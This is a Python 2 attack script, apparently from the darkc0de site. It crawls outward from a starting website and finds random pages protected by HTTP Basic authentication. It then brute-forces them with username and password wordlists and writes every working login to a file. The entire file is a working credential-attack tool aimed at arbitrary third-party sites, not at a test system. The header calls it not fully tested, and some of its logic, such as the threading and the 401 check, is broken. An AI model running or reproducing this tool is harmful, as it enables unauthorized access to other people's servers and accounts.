#!usr/bin/python
#Pop-up Basic Authentication Random Brute Forcer
#It will scan for 401 authentication, brute force and save 
#successfull logins to a file.
#Not fully tested, encourage feedback.
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, random, sys, urllib2, httplib, re, socket
from copy import copy

if len(sys.argv) !=6:
	print "\nUsage: ./webauthbrute_random.py <start website> <userlist> <wordlist> <how many> <file to save logins>\n"
	print "Ex: ./webauthbrute_random.py www.busywebsite.com users.txt words.txt 100 logins.txt\n"
	sys.exit(1)

try:
  	users = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
  
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

wordlist = copy(words)
hits = 0
logins = 0

def geturls(url):
	
	try:
		print "[+] Collecting:",url
		page = urllib2.urlopen(url).read()
		links = re.findall(('http://\w+.\w+\.\w+[/\w+.]*[/.]\w+'), page)
		for link in links:
			if link not in urls and link[-3:].lower() not in ("gif","jpg","png","ico"):
				urls.append(link)
	except(IOError,TypeError,AttributeError,httplib.BadStatusLine,socket.error): pass
	return urls

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])		
	else:
		print "\nReloading Wordlist - Changing User\n"
		reloader()
		value = random.sample(words,  1)
		users.remove(users[0])
		
	lock.release()
	if len(users) ==1:
		return users[0], value[0][:-1]
	else:
		return users[0][:-1], value[0][:-1] 

def getauth(site):
	
	print "[-] Checking Authentication:",site
	global hits
	try:
		req = urllib2.Request(site)
		handle = urllib2.urlopen(req)
		if site in urls:
			print "Removing:",site
			urls.remove(site)
	except(IOError,urllib2.URLError,urllib2.HTTPError,httplib.BadStatusLine,socket.error), msg:
			print "\t- Got:",msg,"\n"
			try:
				if hasattr(msg, 'code') or msg.code == 401:
					authline = msg.headers.get('www-authenticate', '')
					if authline:
						print "[+]",authline
						print "[+] Found site using basic authentication"
						print "[+] Attempting Brute Force on",site,"\n"
						hits +=1
						for i in range(len(words)*len(users)):
							work = threading.Thread()
							work.setDaemon(1)
							work.start()
							threader(site)
							time.sleep(1)
			except(AttributeError):
				pass
	else: 
		print "\t- Got: 200\n"
				
def threader(site):
	username, password = getword()
	global logins
	try:
		print "-"*12
		print "User:",username,"Password:",password
		req = urllib2.Request(site)
		passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
		passman.add_password(None, site, username, password)
		authhandler = urllib2.HTTPBasicAuthHandler(passman)
		opener = urllib2.build_opener(authhandler)
		fd = opener.open(req)
		site = urllib2.urlopen(fd.geturl()).read()
		print "\n[+] Checking the authenticity of the login...\n"
		if not re.search(('denied'), site.lower()):
			print "\t\n\n[+] Username:",username,"Password:",password,"----- Login successful!!!\n\n"
			print "[+] Writing Successful Login:",sys.argv[5],"\n"
			logins +=1
			file = open(sys.argv[5], "a")
			file.writelines("Site: "+site+" Username: "+username+ " Password: "+password+"\n")
			file.close()			
			print "Retrieved", fd.geturl()
			info = fd.info()
			for key, value in info.items():
    				print "%s = %s" % (key, value)
		else: 
			print "- Redirection"
	except (urllib2.HTTPError, httplib.BadStatusLine,socket.error), msg: 
		print "An error occurred:", msg
		pass

def giddyup(start):
	if start[:7] != "http://":
		start = "http://"+start	
	urls = geturls(start)
	for x in range(1,int(sys.argv[4])):
		print "- Destination:",x,"of",int(sys.argv[4])
		if len(urls) < 5000:
			urls = geturls(random.choice(urls))
			print "- Collected:",len(urls)
			site = random.choice(urls)
			getauth(site)
			for i in range(2,site.count('/')):
				site = site.rpartition('/')[0]
				getauth(site)
		else:
			for url in urls[1:2500]:
				urls.remove(url)
			
urls = []
start = sys.argv[1]

print "\n\t d3hydr8[at]gmail[dot]com WebauthBruteForcer v1.0"
print "\t--------------------------------------------------\n"
print "[+] Starter:",start
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words)
print "[+] Scanning:",sys.argv[4]
print "[+] Logins File:",sys.argv[5],"\n"

time.sleep(5)
giddyup(start)

while start:
	print "\n\nFound",hits,"sites using basic authentication."
	print "Logins Reported:",logins
	start = raw_input("Enter new starting site or Press enter to exit: ")
	if start: 
		giddyup(start)	
if hits >= 1:
	print "\n\nFound:",hits,"brute forced\n"
if logins >= 1:
	print "Check:",sys.argv[5]	
print "\n[+] Done\n"
	

